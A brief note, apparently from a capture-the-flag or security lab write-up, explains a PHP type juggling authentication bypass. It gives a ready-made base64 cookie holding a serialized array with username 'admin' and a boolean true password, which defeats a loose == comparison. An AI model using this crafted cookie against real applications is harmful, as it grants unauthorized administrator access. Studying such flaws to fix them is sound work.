# PHP type juggling authentication bypass. Cookie creds is base64(serialize({username:admin, password:true})). The boolean true (b:1;) bypasses loose == password comparison. Decode: YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtiOjE7fQ== = a:2:{s:8:username;s:5:admin;s:8:password;b:1;}

